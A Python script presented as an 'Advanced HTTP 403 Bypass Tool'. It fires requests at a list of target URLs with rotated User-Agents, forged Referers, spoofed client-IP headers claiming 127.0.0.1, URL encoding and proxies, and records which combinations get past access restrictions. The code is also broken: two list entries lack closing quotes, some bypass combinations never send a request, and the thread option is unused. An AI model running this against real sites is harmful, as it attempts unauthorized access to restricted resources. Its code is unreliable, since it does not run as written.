import requests
import argparse
import time
import concurrent.futures
import json
import csv
from itertools import combinations
from urllib.parse import urlparse, quote
import random
from colorama import Fore, Style, init
import sys

# Initialize colorama for color output
init(autoreset=True)

# Static Referers from known domains
STATIC_REFERERS = [
    "https://www.google.com",
    "https://www.bing.com",
    "https://www.github.com",
    "https://www.twitter.com",
    "https://www.reddit.com"
]

# Custom headers for testing
CUSTOM_HEADERS = [
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Client-IP': '127.0.0.1'},
    {'X-Originating-IP': '127.0.0.1'},
    {'Cache-Control': 'no-cache'},
    {'Accept-Language': 'en-US,en;q=0.5'}
]

# Function to generate referer based on the provided URL
def generate_referer(url):
    parsed_url = urlparse(url)
    if parsed_url.netloc:
        referer = f"{parsed_url.scheme}://{parsed_url.netloc}"
    else:
        referer = random.choice(STATIC_REFERERS)
    referer = f"{referer}{parsed_url.path}{parsed_url.query and '?' + parsed_url.query or ''}"
    return referer

# Function to encode URL for bypassing
def encode_url(url):
    return quote(url, safe=':/?&=')

# Function to generate curl command for display
def generate_curl_command(url, method, headers):
    curl_cmd = f"curl -X {method} \"{url}\""
    for key, value in headers.items():
        curl_cmd += f" -H \"{key}: {value}\""
    return curl_cmd

# Function to make HTTP requests
def make_request(url, method="GET", headers=None, show_curl=False, proxies=None, timeout=10):
    try:
        if headers is None:
            headers = {}

        if show_curl:
            print(f"{Fore.CYAN}[CURL] Generating curl command for {url} with headers: {headers}")
            curl_cmd = generate_curl_command(url, method, headers)
            print(f"{Fore.CYAN}[CURL] {curl_cmd}")

        response = requests.request(method, url, headers=headers, proxies=proxies, timeout=timeout)

        return response
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[Error] Failed to connect: {e}")
        return None

# Save results to CSV or JSON
def save_results(successful_bypasses, failed_urls, file_format="json"):
    if file_format == "json":
        with open("results.json", "w") as f:
            json.dump({"successful_bypasses": successful_bypasses, "failed_urls": failed_urls}, f, indent=4)
    elif file_format == "csv":
        with open("results.csv", "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["URL", "Combination", "Status"])
            for success in successful_bypasses:
                writer.writerow([success[0], success[1], success[2]])

# Display a loading symbol
def display_loading():
    print(f"{Fore.YELLOW}[INFO] Loading... ", end="", flush=True)
    for _ in range(3):
        print(".", end="", flush=True)
        time.sleep(1)
    print(" Done!")

# Main function
def main():
    parser = argparse.ArgumentParser(
        description="Advanced HTTP 403 Bypass Tool",
        epilog="Example command : python3 mnm.py -u <urls.txt> -ua <user_agents.txt> "
    )
    parser.add_argument("-u", "--url-file", required=True, help="File containing URLs to test (one per line)")
    parser.add_argument("-ua", "--user-agent-file", help="File with User-Agent list (optional)")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST", "PUT", "HEAD", "DELETE"], help="HTTP method to use")
    parser.add_argument("--show-curl", action="store_true", help="Display the curl command for each request")
    parser.add_argument("-t", "--throttle", type=int, default=1, help="Throttle time between requests (seconds)")
    parser.add_argument("--proxies", help="File containing proxies for requests")
    parser.add_argument("--output", choices=["json", "csv"], default="json", help="Output format for results")
    parser.add_argument("--success-only", action="store_true", help="Show only successful bypasses in the output")
    parser.add_argument("--retry", action="store_true", help="Retry failed requests")
    parser.add_argument("--timeout", type=int, default=10, help="Set timeout for requests")
    parser.add_argument("--threads", type=int, default=50, help="Number of threads for parallel testing")
    args = parser.parse_args()

    # Load URLs from file
    with open(args.url_file, 'r') as file:
        urls = [line.strip() for line in file if line.strip()]

    # Load User-Agents from file (if provided)
    if args.user_agent_file:
        with open(args.user_agent_file, 'r') as file:
            user_agents = [line.strip() for line in file if line.strip()]
    else:
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9
            "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
            "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
            "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",
            "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
            "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",
            "Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
            "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0"
        ]

    # Load proxies from file (if provided)
    proxies = None
    if args.proxies:
        with open(args.proxies, 'r') as file:
            proxy_list = [line.strip() for line in file if line.strip()]
        proxies = {'http': random.choice(proxy_list), 'https': random.choice(proxy_list)}

    # Generate all combinations of methods
    methods = ["User-Agent", "Referer", "Custom Headers", "URL Encoding"]
    method_combinations = []
    for r in range(1, len(methods) + 1):
        method_combinations.extend(combinations(methods, r))

    successful_bypasses = []
    failed_urls = []

    # Sequentially process each URL one by one
    display_loading()

    for url in urls:
        print(f"\n{Fore.YELLOW}Testing URL: {Fore.CYAN}{url}{Style.RESET_ALL}")
        successful_bypass = test_url(url, method_combinations, user_agents, proxies, args)
        if successful_bypass["success"]:
            successful_bypasses.append(successful_bypass["data"])
        else:
            failed_urls.append(successful_bypass["data"])

    # If success-only flag is set, only show successful bypasses
    if args.success_only:
        save_results(successful_bypasses, [], file_format=args.output)
    else:
        save_results(successful_bypasses, failed_urls, file_format=args.output)

def test_url(url, method_combinations, user_agents, proxies, args):
    successful_bypasses = []

    # Test all combinations for this URL in a specific order
    for combination in method_combinations:
        headers = {}

        if "User-Agent" in combination:
            for user_agent in user_agents:
                headers["User-Agent"] = user_agent
                if "Referer" in combination:
                    referer = generate_referer(url)
                    headers["Referer"] = referer
                if "Custom Headers" in combination:
                    for custom_header in CUSTOM_HEADERS:
                        headers.update(custom_header)
                target_url = encode_url(url) if "URL Encoding" in combination else url

                print(f"{Fore.BLUE}[*] Testing combination: {combination} for URL: {url}")

                # Show curl command if --show-curl is active
                if args.show_curl:
                    response = make_request(target_url, method=args.method, headers=headers, show_curl=True, proxies=proxies, timeout=args.timeout)
                else:
                    response = make_request(target_url, method=args.method, headers=headers, show_curl=False, proxies=proxies, timeout=args.timeout)

                time.sleep(args.throttle)

                if response and response.status_code == 200:
                    print(f"{Fore.GREEN}[Bypass Success] Combination: {combination} - Status: {response.status_code}")
                    successful_bypasses.append((url, combination, response.status_code))
                    break
    if successful_bypasses:
        return {"success": True, "data": successful_bypasses}
    else:
        print(f"{Fore.RED}[Failed] No bypass methods worked for {url}")
        return {"success": False, "data": url}

if __name__ == "__main__":
    main()
